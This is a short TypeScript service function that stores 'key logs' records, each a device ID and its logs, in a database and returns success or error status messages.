import KeyLogs from "../models/keylogs.model";
import { KeyLogsModelType } from "../utils";

// Add New KeyLogs

export const addNewKeyLogs = async (data: any) => {
	try {
		const { deviceId, logs } = data;

		const newKeyLog: KeyLogsModelType = new KeyLogs({
			deviceId,
			logs,
		});

		await newKeyLog.save();

		return { status: 200, message: "Key logs added successfully" };
	} catch (error) {
		console.error("Error adding key logs:", error);
		return { status: 500, error: "Failed to add key logs" };
	}
};
